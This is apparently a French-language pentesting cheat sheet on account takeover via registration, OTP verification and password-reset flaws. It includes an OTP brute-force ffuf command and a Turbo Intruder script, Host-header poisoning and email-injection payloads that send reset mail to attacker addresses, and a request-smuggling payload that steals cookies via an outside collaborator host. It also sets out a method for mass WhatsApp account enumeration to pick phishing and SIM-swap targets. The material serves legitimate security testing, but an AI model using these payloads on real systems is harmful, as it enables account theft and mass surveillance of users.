# Inscription & Vulnérabilités de prise de contrôle

{{#include ../banners/hacktricks-training.md}}

## Prise de contrôle par inscription

### Inscription en double

- Essayez de créer en utilisant un nom d'utilisateur existant
- Vérifiez en variant l'email :
- majuscules
- +1@
- ajoutez un point dans l'email
- caractères spéciaux dans la partie locale de l'email (%00, %09, %20)
- Placez des caractères blancs après l'email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Essayez des astuces de canonicalisation d'adresses email (dépend du service) :
- Gmail ignore les points et le subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` deliver to `victim@gmail.com`
- Certains fournisseurs ne distinguent pas la casse dans la partie locale
- Certains fournisseurs acceptent des confusables Unicode. Essayez des homoglyphes et le soft hyphen `\u00AD` dans la partie locale
- Abusez-en pour : contourner les contrôles d'unicité, obtenir des comptes dupliqués/workspace invites, ou bloquer les inscriptions de la victime (DoS temporaire) pendant que vous préparez une prise de contrôle

### Énumération des noms d'utilisateur

Vérifiez si vous pouvez déterminer quand un nom d'utilisateur est déjà enregistré dans l'application.

- Messages d'erreur différents ou codes d'état HTTP différents
- Différences de timing (un utilisateur existant peut déclencher une recherche vers l'IdP/DB)
- Autoremplissage du formulaire d'inscription avec des données de profil pour des emails connus
- Vérifiez les flux team/invite : saisir un email peut révéler si un compte existe

### Politique de mot de passe

Lors de la création d'un utilisateur, vérifiez la politique de mot de passe (vérifiez si vous pouvez utiliser des mots de passe faibles).  
Dans ce cas, vous pouvez tenter un bruteforce des identifiants.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Changer l'email

Une fois enregistré, essayez de changer l'email et vérifiez si cette modification est correctement validée ou si elle peut être modifiée vers des emails arbitraires.

### Autres vérifications

- Vérifiez si vous pouvez utiliser des **adresses email jetables** (mailinator, yopmail, 1secmail, etc.) ou contourner la blocklist avec du subaddressing comme `victim+mailinator@gmail.com`
- Un **mot de passe** **long** (>200) entraîne un **DoS**
- **Vérifiez les limites de taux sur la création de comptes**
- Utilisez username@**burp_collab**.net et analysez le **callback**
- Si une vérification par numéro de téléphone est utilisée, vérifiez les cas limites de parsing/injection des numéros

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Découverte de contacts / oracles d'énumération d'identifiants

Les messengers centrés sur le numéro de téléphone exposent un **oracle de présence** chaque fois que le client synchronise les contacts. Rejouer les requêtes de découverte de WhatsApp a historiquement fourni **>100M lookups per hour**, permettant des énumérations de comptes quasi complètes.

**Flux d'attaque**

1. **Instrumentez un client officiel** pour capturer la requête d'upload du carnet d'adresses (blob authentifié de numéros E.164 normalisés). Rejouez-la avec des numéros générés par l'attaquant tout en réutilisant les mêmes cookies/device token.
2. **Regroupez les numéros par requête**: WhatsApp accepte des milliers d'identifiants et renvoie registered/unregistered plus des métadonnées (business, companion, etc.). Analysez les réponses hors-ligne pour construire des listes de cibles sans envoyer de messages aux victimes.
3. **Scalez horizontalement** l'énumération avec SIM banks, cloud devices, ou residential proxies afin que la limitation par compte/IP/ASN ne se déclenche jamais.

**Modélisation du plan de numérotation**

Modélisez le plan de numérotation de chaque pays pour écarter les candidats invalides. Le dataset NDSS (`country-table.*`) liste les indicatifs pays, la densité d'adoption et la répartition par plateforme afin que vous puissiez prioriser les plages avec un fort taux de hits. Exemple de code de seed:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise les préfixes qui correspondent à des allocations réelles (Mobile Country Code + National Destination Code) avant d'interroger l'oracle pour que le débit reste utile.

**Turning enumerations into targeted attacks**

- Alimenter l'oracle avec des leaked phone numbers (e.g., Facebook’s 2021 breach) pour déterminer quelles identités sont encore actives avant phishing, SIM-swapping ou spamming.
- Segmenter les recensements par pays/OS/type d'app pour trouver des régions avec un filtrage SMS faible ou une adoption importante de WhatsApp Business pour l'ingénierie sociale localisée.

**Public-key reuse correlation**

WhatsApp expose la X25519 identity key de chaque compte lors du session setup. Request identity material pour chaque enumerated number et dédupliquez les public keys pour révéler des account farms, des cloned clients ou un firmware insecure — des clés partagées désanonymisent les opérations multi-SIM.

## Weak Email/Phone Verification (OTP/Magic Link)

Les flux d'inscription vérifient souvent la propriété via un OTP numérique ou un magic-link token. Failles typiques:

- OTP devinable ou court (4–6 chiffres) sans limitation de débit efficace ni suivi IP/appareil. Essayez des tentatives parallèles et la rotation d'en-têtes/IP.
- Réutilisation de l'OTP entre actions ou comptes, ou non lié à l'utilisateur/action spécifique (p. ex., même code fonctionnant pour connexion et inscription, ou fonctionnant après modification de l'email).
- Multi-value smuggling: certains backends acceptent plusieurs codes et vérifient si l'un correspond. Essayez:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguer wrong vs expired vs wrong-user codes par status/message/longueur du body.
- Tokens non invalidés après succès ou après changement de mot de passe/email.
- Le verification token n'est pas lié au user agent/IP, permettant une complétion cross-origin depuis des pages contrôlées par un attaquant.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Tentatives parallèles/concurrentes pour contourner les verrouillages séquentiels (utiliser Turbo Intruder dans Burp) :

<details>
<summary>Extrait Turbo Intruder pour inonder les tentatives OTP à 6 chiffres</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: soumettez le même OTP valide simultanément dans deux sessions ; parfois une session devient un compte attaquant vérifié tandis que le flux de la victim réussit également.
- Testez aussi Host header poisoning sur les verification links (comme le reset poisoning ci‑dessous) pour leak ou compléter la vérification sur un host contrôlé par l’attaquant.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Une classe puissante de problèmes survient lorsqu’un attaquant effectue des actions sur le e‑mail de la victim avant que celle‑ci ne crée son compte, puis récupère l’accès plus tard.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Conseils pratiques

- Récupérez les flows et endpoints depuis les bundles web/mobile. Cherchez les endpoints d’inscription classique, de SSO linking, de changement email/phone, et de password reset.
- Créez une automatisation réaliste pour maintenir des sessions actives pendant que vous testez d’autres flows.
- Pour les tests SSO, déployez un IdP OIDC de test et émettez des tokens avec des claims `email` pour l’adresse de la victim et `email_verified=false` afin de vérifier si le RP fait confiance à des IdP non vérifiés.
- Après tout password reset ou changement d’email, vérifiez que :
  - toutes les autres sessions et tokens sont invalidés,
  - les capacités de changement d’email/phone en attente sont annulées,
  - les IdPs/emails/phones précédemment liés sont re‑vérifiés.

Note : Une méthodologie étendue et des études de cas de ces techniques sont documentées par les recherches sur le pre‑hijacking de Microsoft (voir References à la fin).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les paramètres API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et aller à la fonctionnalité **Change password**.
2. Démarrez Burp Suite et interceptez la requête
3. Envoyez-la à l'onglet Repeater et modifiez les paramètres : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token de réinitialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le token de réinitialisation de mot de passe doit être généré aléatoirement et unique à chaque fois.\
Essayez de déterminer si le token expire ou s'il est toujours le même ; dans certains cas l'algorithme de génération est faible et peut être deviné. Les variables suivantes peuvent être utilisées par l'algorithme.

- Horodatage
- ID utilisateur (UserID)
- Email de l'utilisateur
- Prénom et nom
- Date de naissance
- Cryptographie
- Uniquement des chiffres
- Séquence de token courte ( characters between \[A-Z,a-z,0-9])
- Réutilisation de token
- Date d'expiration du token

### Fuite du token de réinitialisation <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Déclenchez une demande de réinitialisation de mot de passe via l'API/UI pour un email spécifique, par ex. : test@mail.com
2. Inspectez la réponse serveur et vérifiez la présence de `resetToken`
3. Puis utilisez le token dans une URL telle que `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Réinitialisation du mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le système avec un nom d'utilisateur identique à celui de la victime, mais avec des espaces ajoutés avant et/ou après le nom d'utilisateur. ex. : `"admin "`
2. Demandez une réinitialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le token envoyé à votre email et réinitialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd était vulnérable à cette attaque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contrôle de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez un XSS dans l'application ou un sous-domaine si les cookies sont définis pour le domaine parent : `*.domain.com`
2. Leak le **sessions cookie** actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contrôle de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utilisez **smuggler** pour détecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Concevez une requête qui écrasera le `POST / HTTP/1.1` avec les données suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but d'open redirect les victimes vers burpcollab et de voler leurs cookies\
3. La requête finale pourrait ressembler à ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone rapporte l'exploitation de ce bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Prise de contrôle de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Créer un payload pour le CSRF, par ex. : “HTML form with auto submit for a password change”
2. Envoyer le payload

### Prise de contrôle de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token peut être utilisé pour authentifier un utilisateur.

- Modifier le JWT avec un autre User ID / Email
- Vérifier si la signature JWT est faible

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Some signup handlers perform an upsert when the provided email already exists. If the endpoint accepts a minimal body with an email and password and does not enforce ownership verification, sending the victim's email will overwrite their password pre-auth.

- Découverte : récupérer les noms d'endpoint depuis le JS bundlé (ou le trafic de l'app mobile), puis fuzz les chemins de base comme /parents/application/v4/admin/FUZZ en utilisant ffuf/dirsearch.
- Indices de méthode : un GET renvoyant des messages comme "Only POST request is allowed." indique souvent le verbe correct et qu'un corps JSON est attendu.
- Corps minimal observé en conditions réelles:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Exemple de PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impact : Full Account Takeover (ATO) sans aucun reset token, OTP, ou email verification.

## Références

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
